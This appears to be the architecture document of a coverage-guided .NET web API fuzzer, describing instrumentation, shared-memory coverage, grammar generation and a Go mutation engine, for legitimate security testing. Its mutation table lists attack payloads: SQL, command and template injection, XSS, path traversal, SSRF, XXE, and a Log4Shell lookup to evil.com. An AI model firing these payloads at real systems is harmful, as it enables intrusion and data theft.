# UpsideFuzz Platform Architecture

This document describes the internal design, components, and data flows of the **UpsideFuzz** platform — from source analysis through instrumentation, runtime synchronization, coverage feedback, and coverage-guided fuzzing.

---

## High-Level Overview

The platform automates transforming a standard .NET solution into a feedback-driven fuzzing target in six stages:

1. **Analysis** — Discovering business logic across all projects in a solution
2. **Preparation** — Adapting Docker configs, injecting coverage infrastructure
3. **Instrumentation** — Injecting SharpFuzz coverage probes into target DLLs during Docker build
4. **Synchronization** — Linking all instrumented DLLs to a single shared memory bitmap at runtime
5. **Grammar Generation** — Compiling an OpenAPI spec into typed request templates via RESTler + source enrichment
6. **Fuzzing** — Sending mutated inputs with epoch-based scheduling, adaptive concurrency, and crash triage

---

## End-to-End Flow Diagram

```
┌────────────────────────────────────────────────────────────────────┐
│                        .NET Solution Source                        │
│              (*.sln / *.csproj / Dockerfile / compose)             │
└──────────────────────────────┬─────────────────────────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │  fuzz-prep-multi.py  │
                    │                      │
                    │  • Scan *.csproj     │
                    │  • Skip test projects│
                    │  • Detect biz logic  │
                    │  • Collect namespaces│
                    └──────────┬──────────┘
                               │  Writes to OUTPUT_DIR (copy of src)
         ┌─────────────────────┼──────────────────────────┐
         │                     │                          │
         ▼                     ▼                          ▼
  Dockerfile            compose.yaml           New/Modified Files
  (4 stages)           (+SHM volumes)         instrumentor_src/
  injected             +Development env       Helpers/CoverageExtensions.cs
                       +sidecar template      Program.cs (patched)
                                              *.csproj (patched)
                               │
                    ┌──────────▼──────────┐
                    │  docker compose      │
                    │       build          │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              │                │                │
     Stage 1: builder   Stage 2+3: instrument  Stage 4: runtime
     dotnet publish     SharpFuzz IL rewriting  minimal aspnet image
                        (namespace-filtered)    COPY from instrumentation
              │                │                │
              └────────────────┴────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │  docker compose up   │
                    │                      │
                    │  [App Container]     │
                    │  ┌─────────────────┐ │
                    │  │  Web API Process │ │
                    │  │  DLL-A.dll ──┐  │ │
                    │  │  DLL-B.dll ──┼─►│ │  SHM bitmap (64KB)
                    │  │  DLL-C.dll ──┘  │ │  /coverage_shm/bitmap
                    │  │  [SyncSharpFuzz]─┼─┼─► (tmpfs mmap)
                    │  │  /shm/create    │ │
                    │  │  /shm/coverage  │ │
                    │  │  /shm/reset     │ │
                    │  └─────────────────┘ │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              │                                 │
              ▼                                 ▼
   compile-grammar.sh                  GET /swagger/v1/swagger.json
   + enhance-grammar.py
              │
     ┌────────┴────────┐
     │                 │
     ▼                 ▼
 grammar.py         dict.json
 (templates)        (tokens)
     │
     └──────────────────────────────────────────┐
                                                │
                    ┌───────────────────────────▼──────────────────────┐
                    │            Void                         │
                    │                                                   │
                    │  ┌─ Epoch scheduler ─────────────────────────┐   │
                    │  │  Baseline → Deterministic → Havoc →        │   │
                    │  │  Splicing                                  │   │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Worker pool (adaptive concurrency) ───────┐  │
                    │  │  goroutines → HTTP requests → responses    │  │
                    │  │  cookie jar, auth header, anti-forgery     │  │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Coverage reader ──────────────────────────┐  │
                    │  │  Mode A: mmap /coverage_shm/bitmap         │  │
                    │  │  Mode B: GET /shm/coverage (HTTP)          │  │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Mutation engine ──────────────────────────┐  │
                    │  │  MOpt-style weighted categories             │  │
                    │  │  sqli / xss / cmdi / ssti / ssrf /...      │  │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Crash triage ─────────────────────────────┐  │
                    │  │  Repro → Minimize → JSONL → PoC file       │  │
                    │  └───────────────────────────────────────────┘   │
                    └───────────────────────────────────────────────────┘
```

---

## 1. Discovery & Analysis (`fuzz-prep-multi.py`)

### Project Enumeration
- Scans the source directory for all `.csproj` files
- Identifies the **main project** (web SDK or `--main` flag)
- **Skips test projects** by name/path pattern (`*.Tests.csproj`, `/test/`, `/tests/`)

### Business Logic Detection
Uses file-name and directory heuristics to identify code worth fuzzing:

| Pattern | Category |
|---------|----------|
| `*Controller.cs` | API endpoint handlers |
| `*Service.cs` | Business logic services |
| `*Repository.cs` | Data access layer |
| `*Validator.cs` | Input validation rules |
| `*Handler.cs` | CQRS/MediatR handlers |
| `*Command.cs`, `*Query.cs` | CQRS command/query objects |
| `*Aggregate.cs`, `*Specification.cs` | DDD patterns |
| `*Endpoint.cs` | Minimal API / FastEndpoints |
| `*Logic.cs`, `*Manager.cs` | Domain logic |
| Directories: `Controllers/`, `Features/`, `Handlers/` | Structural detection |

### Dynamic Configuration Detection

| Detection | Method | Fallback |
|-----------|--------|----------|
| Builder variable name | Regex on `WebApplication.CreateBuilder(...)` | `builder` |
| App variable name | Regex on `<builder>.Build()` | `app` |
| Dockerfile runtime stage | Last `FROM ... AS <name>` stage | `runtime` |
| Dockerfile publish directory | `--output` / `-o` in `dotnet publish` | `/app/publish` |
| Dockerfile source stage | Stage before runtime with publish output | `publish` |
| SDK version | `global.json` → `sdk.version` | Derived from `TargetFramework` |
| Target framework | `<TargetFramework>` or highest in `<TargetFrameworks>` | `net8.0` |
| Root namespace | `<RootNamespace>` in `.csproj` | Project name |

### Namespace Aggregation
Collects namespaces from identified files to create a **whitelist filter** for the instrumentor. Only code in these namespaces gets instrumented — not system libraries.

---

## 2. Docker Build Pipeline

The adapted Dockerfile has 4 stages:

```
┌───────────────────────────┐
│  instrumentor-build        │  Builds the SharpFuzz instrumentor tool
│  FROM sdk AS               │  from instrumentor_src/Program.cs
│  instrumentor-build        │  (separate stage — doesn't slow app build)
└─────────────┬─────────────┘
              │
┌─────────────▼─────────────┐
│  builder → publish         │  Standard project build:
│  FROM sdk AS builder       │  dotnet restore → dotnet publish
└─────────────┬─────────────┘
              │
┌─────────────▼─────────────┐
│  instrumentation           │  FROM publish AS instrumentation
│  Inherits published output │  Copies instrumentor from step 1
│  Runs: instrumentor.dll    │  Instruments all business logic DLLs
│  for each *.dll            │  in-place (IL rewriting)
└─────────────┬─────────────┘
              │
┌─────────────▼─────────────┐
│  final / runtime / app     │  FROM aspnet AS final
│  COPY --from=instrumentation │  Gets pre-instrumented binaries
│  Runs the app normally     │  No SDK needed at runtime
└───────────────────────────┘
```

---

## 3. Instrumentation (IL Rewriting with SharpFuzz)

### How SharpFuzz Works
1. **Assembly Rewriting** — Reads target DLL using Mono.Cecil
2. **Probe Injection** — Inserts `SharpFuzz.Common.Trace.OnBranch` call at every basic block entry
3. **Shared Memory** — Injected code expects `SharpFuzz.Common.Trace.SharedMem` to point to valid memory

### Namespace-Filtered Instrumentation
The instrumentor only instruments types whose full name matches the discovered namespaces. Explicitly excluded:
- `Program`, `Startup` — entry points
- `Migration`, `DesignTimeDbContext` — EF Core infrastructure
- `CoverageExtensions` — our own coverage code
- Auto-generated types (`.g.`, `c__DisplayClass`, `d__`)
- DTOs, ViewModels, Request/Response models — safe to skip (reduce instrumentation noise)

This prevents instrumenting framework code (which causes crashes) while covering the business logic that matters.

---

## 4. Runtime Synchronization (SHM Linking)

When the application starts, multiple DLLs each have their own copy of SharpFuzz. They all need to write to the **same** 64KB coverage bitmap.

### SHM Allocation (Dual Mode)

**Mode 1: File-Backed mmap** (when `coverage_shm` tmpfs volume is mounted)
```
/coverage_shm/bitmap  ← tmpfs file, 64KB
  ↑ written by ASP.NET (all DLLs via reflection linking)
  ↑ read by Go fuzzer sidecar (direct mmap, zero HTTP overhead)
```

```csharp
var fs = new FileStream("/coverage_shm/bitmap", FileMode.OpenOrCreate, ...);
fs.SetLength(65536);
mmf = MemoryMappedFile.CreateFromFile(fs, null, 65536, ...);
accessor = mmf.CreateViewAccessor(0, 65536);
accessor.SafeMemoryMappedViewHandle.AcquirePointer(ref ptr);
globalShmAddr = (IntPtr)ptr;
```

**Mode 2: Heap Allocation** (fallback when no tmpfs volume)
```csharp
globalShmAddr = Marshal.AllocHGlobal(65536);
```
Coverage only accessible via HTTP endpoints (`GET /shm/coverage`).

The `/shm/create` response reports which mode is active: `"mode":"file-backed-mmap"` or `"mode":"heap"`.

### Reflection-Based Linking (`SyncSharpFuzz`)

```
AppDomain.CurrentDomain.GetAssemblies()
  → find all SharpFuzz.Common.Trace types
  → set SharedMem field to globalShmAddr
  → all DLLs now write to the same 64KB bitmap
```

This works regardless of how many project DLLs were instrumented — they all get linked to the same pointer at startup.

---

## 5. Coverage Reporting Protocol

### `POST /shm/create` — Initialize
- Allocates 64KB SHM (or opens existing tmpfs file)
- Calls `SyncSharpFuzz()` to link all loaded DLLs
- Returns `{"status": "synced", "mode": "...", "bitmap_size": 65536}`

### `GET /shm/coverage` — Global Stats
- Reads the 64KB bitmap via pointer arithmetic
- Counts bytes > 0 (`edges`) and sums all values (`hits`)
- Returns `{"edges": 150, "hits": 5000}`

### `POST /shm/reset` — Reset Bitmap
- Zeroes the 64KB bitmap
- Used between fuzzing sessions or before per-request measurement

### `GET /shm/coverage/traces` — Per-Request Attribution
- Middleware records `edgesBefore` → executes request → records `edgesAfter`
- Delta stored in `ConcurrentDictionary` keyed by Trace ID

---

## 6. Grammar Generation (RESTler + Enhancement)

```
swagger.json
     │
     ▼
RESTler compiler
     │
     ├── grammar.py       Raw typed request templates
     │   (Request objects, Fuzzable fields, produces/consumes deps)
     │
     └── dict.json        Domain-specific string tokens
          │
          ▼
     enhance-grammar.py
          │
          ├── OpenAPI constraints: enum values, format, min/max, pattern
          ├── C# source constraints: [Required], [Range], [StringLength],
          │   [RegularExpression], FluentValidation chains, enum declarations
          └── Multipart form-data: autogenerated seed request templates
```

The grammar provides:
- Request templates with method, path, headers, and body structure
- Typed fuzzable fields (`string`, `int`, `number`, `bool`, `datetime`, `uuid`, `object`)
- **Producer-consumer dependencies** — POST creates an ID that GET/PUT/DELETE uses

---

## 7. Void Architecture

The production fuzzer is the Go runtime (`void/go/main.go` + `advanced_features.go`). It implements coverage-guided mutation with structured epochs, a seed corpus, adaptive concurrency, and crash triage.

### Component Map

```
void/go/
├── main.go              Core engine: Config, worker pool, epoch scheduler,
│                        mutation engine, SHM reader, corpus, TUI dashboard
├── advanced_features.go Crash triage, PoC generation, crash minimization,
│                        race condition probing, multi-identity mode
├── go.mod               Module: void, go 1.22
└── void        Pre-built binary (Linux/amd64)
```

### Epoch Architecture

The time budget is divided into four epochs with automatic transitions:

```
Time Budget
|------+--------+------------------------+-------------|
|  5%  |  30%   |          50%           |    15%      |
| Base |  Det   |         Havoc          |  Splicing   |
| line |        |   (depth escalation)   | (cross-seed)|
```

| Epoch | Budget | Description |
|-------|--------|-------------|
| **Baseline** | 5% | Send every template **unmutated**. Populates seed corpus. Establishes coverage baseline. `batch_size=1` for accurate per-request attribution. |
| **Deterministic** | 30% | Pick seed by energy, apply **one mutation** per field. Systematic, methodical exploration. |
| **Havoc** | 50% | Pick seed, apply **1-4 stacked mutations**. Depth starts at 1, escalates on coverage stall. |
| **Splicing** | 15% | Pick **two** seeds, use one's template + havoc mutations. Cross-pollinates payloads. |

### Mutation Engine (MOpt-Style Weighted Categories)

Mutations are organized into categories with adaptive weights — categories that discover more coverage edges get higher selection probability:

| Category | Weight | Example Payloads |
|----------|--------|-----------------|
| `boundary` | 1.0 | `""`, `null`, `NaN`, `Infinity` |
| `overflow` | 1.0 | `AAA...` × 100, 1024, 5000, 10000 |
| `sqli` | 1.5 | `' OR '1'='1`, `'; DROP TABLE--`, UNION SELECTs |
| `xss` | 1.5 | `<script>alert(1)`, SVG/img onload, JS proto |
| `cmdi` | 1.5 | `; id`, `` `id` ``, `$(id)` |
| `path_traversal` | 1.5 | `../../../etc/passwd`, encoded variants |
| `ssrf` | 1.5 | AWS/GCP metadata URLs, `file:///`, `dict://` |
| `ssti` | 1.5 | `{{7*7}}`, `${7*7}`, `#{7*7}` |
| `open_redirect` | 1.0 | `//evil.com`, `\\/evil.com` |
| `crlf` | 1.0 | `\r\nX-Injected: pwned` |
| `log4shell` | 1.0 | `${jndi:ldap://evil.com/x}` |
| `nosqli` | 1.0 | `{"$gt":""}`, `{"$where":"sleep(5000)"}` |
| `ldap` | 1.0 | `*)(uid=*))(|(uid=*` |
| `xxe` | 1.0 | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` |
| `unicode` | 1.0 | Zero-width chars, homoglyphs, BOM, RTL |

Weight update: `weight = 1.0 + hitRate × 4.0` — up to 5× base weight for productive categories.

### Seed Corpus & Energy Scheduling

A **seed** = saved (template + rendered payload) pair. Corpus = all seeds.

**Lifecycle:**
1. **Baseline** → unmutated renderings populate initial corpus
2. **Growth** → mutated requests that find new edges become new seeds
3. **Selection** → Fenwick tree weighted random by **energy**
4. **Boosting** → +5 energy per new edge discovered by a seed's mutations
5. **Decay** → 0.5% energy decay per pick (prevents starvation)

### Coverage-Guided Loop

```
for each batch (N = concurrency):
    before_edges = read_coverage()    ← mmap or HTTP
    tasks = [send_request(r) for r in batch]
    results = await all tasks         ← parallel HTTP goroutines
    after_edges = read_coverage()
    batch_delta = after_edges - before_edges

    if batch_delta > 0:
        → Save high-delta requests as new seeds
        → Boost energy of contributing seeds
        → Reset stall counter
    else:
        → Increment stall counter
        → After N stalls: increase havoc depth
```

### Coverage Reading Modes

| Mode | How | Overhead |
|------|-----|----------|
| **HTTP** (default) | `GET /shm/coverage` — one HTTP round-trip per `--coverage-interval` requests | Low (~1ms) |
| **Direct SHM** (`--direct-shm`) | `mmap.read(bitmap)` on `/coverage_shm/bitmap` | Near-zero |
| **Per-request header** | `X-Coverage-Delta` response header injected by middleware | Zero overhead per batch |

### Advanced Features (`advanced_features.go`)

| Feature | Description |
|---------|-------------|
| **Crash triage** | Re-probes 5xx with same payload; extracts exception type from `X-Exception-Type`; generates curl PoC |
| **Crash minimization** | Binary search through request payload removing fields until crash fails to repro |
| **Race condition probing** | Sends `--race-burst` parallel identical requests to probe TOCTOU conditions |
| **Multi-identity** | Rotates through multiple auth tokens for authorization bypass testing |
| **Anti-forgery tokens** | Discovers HTML `<input>` token fields, pools and rotates them automatically |
| **Source-aware priority** | Boosts endpoints backed by detected business logic files from `--src` |
| **Adaptive concurrency** | PID-style controller adjusts goroutine count based on error rate |
| **Sequence fanout** | Builds producer→consumer chains using runtime-extracted response IDs |

---

## 8. SHM Architecture: Why Shared Memory?

HTTP coverage polling (the fallback) adds ~0.5–2ms per batch. At high concurrency (64+ workers), this becomes a meaningful bottleneck. Direct SHM mode eliminates it entirely:

| Method | Throughput (est.) | Overhead | Notes |
|--------|-------------------|----------|-------|
| HTTP JSON (`GET /shm/coverage`) | ~300–600 req/s cap | TCP + routing + serialization | Works everywhere, no volume needed |
| File-backed mmap (`--direct-shm`) | 2000+ req/s | ~microseconds (OS page cache) | Requires `coverage_shm` tmpfs volume (Docker sidecar mode) |

How file-backed mmap works across containers:

```
  [App Container]                    [Fuzzer Container]
  /coverage_shm/bitmap               /coverage_shm/bitmap
        ↑                                   ↓
        └─────── Docker tmpfs volume ────────┘
                  (same physical pages)

  SharpFuzz probes write at every branch
  Go fuzzer reads bitmap every N requests
  → zero HTTP overhead, zero serialization
```

---

## 9. Verified Projects

These projects were successfully instrumented and fuzzed using UpsideFuzz:

| Project | Type | Services | Notes |
|---------|------|---------|-------|
| **mpt-helpdesk** | Internal SoftwareOne API | SQL Server, Azure Service Bus, Blob Storage, Worker | Multi-project; main project is `Mpt.Helpdesk.Api` |
| **mpt-currency** | Internal SoftwareOne API | SQL Server | Single web project |
| **nopCommerce** | OSS e-commerce (.NET) | SQL Server, multiple DLLs | Large solution; uses `prepare-nopcommerce.sh` bootstrap |
| **eShopOnWeb** | OSS dev sample | SQL Server | `PublicApi` is main project |
| **CustomerLoyalty** | OSS dev sample | PostgreSQL, Redis, PGAdmin | `WebAPI` is main project |

---

## 10. Project File Map (Current State)

```
mvpsharpfuzznet/
│
├── fuzz-prep-multi.py          ★ Main tool: analyze, instrument, adapt Dockerfile/compose
├── compile-grammar.sh          ★ Compile swagger.json → RESTler grammar
├── enhance-grammar.py          ★ Post-process grammar/dict (OpenAPI + C# source constraints)
├── sanitize-swagger-for-restler.sh   Fix deepObject/nested arrays
├── deploy-grammar.sh           Deploy grammar to void/
├── prepare-nopcommerce.sh      Bootstrap nopCommerce end-to-end
│
├── INSTRUCTIONS.md             ★ Complete runbook (instrument → fuzz → analyze)
├── ARCHITECTURE.md             ★ Platform internals, diagrams, SHM design
├── README.md                   Overview, features, structure
│
├── instrumentor/               Reference instrumentor source + build script
│   ├── Program.cs              Standalone instrumentor (namespace-filtered)
│   ├── Program.Generated.cs    Generated version
│   ├── instrument.sh           Build + run script
│   └── instrumentor.csproj     Project file
│
├── void/
│   ├── go/
│   │   ├── main.go             ★ Go fuzzer: epochs, workers, mutations, SHM, TUI
│   │   ├── advanced_features.go  Crash triage, race probing, multi-identity
│   │   ├── go.mod              Module file (go 1.22)
│   │   └── void       Pre-built binary
│   ├── Dockerfile.go           ★ Container image for Go fuzzer sidecar
│   ├── grammar.py              Active compiled grammar (deploy-grammar.sh target)
│   ├── dict.json               Active dictionary
│   ├── templates.helpdesk.json Pre-exported template JSON for helpdesk
│   └── README.md               Go fuzzer reference (flags, modes)
│
├── grammars/
│   ├── eshop/                  grammar.py + dict.json for eShopOnWeb
│   ├── loyalty/                grammar.py + dict.json for CustomerLoyalty
│   ├── helpdesk/               grammar.py + dict.json for mpt-helpdesk
│   └── nopcommerce/            grammar.py + dict.json for nopCommerce
│
├── restler_bin/                RESTler compiler binaries
├── restler_input/              RESTler input (swagger)
├── restler_output/             RESTler compiler output (temporary)
│
├── mpt-helpdesk/               mpt-helpdesk source project
├── mpt-currency/               mpt-currency source project
├── prepared-helpdesk/          mpt-helpdesk instrumented (ready to run)
├── mpt-prepared/               mpt-currency instrumented (ready to run)
│
└── softwareone-marketplace-currency-dictionary.json   Custom dict for currency API
```
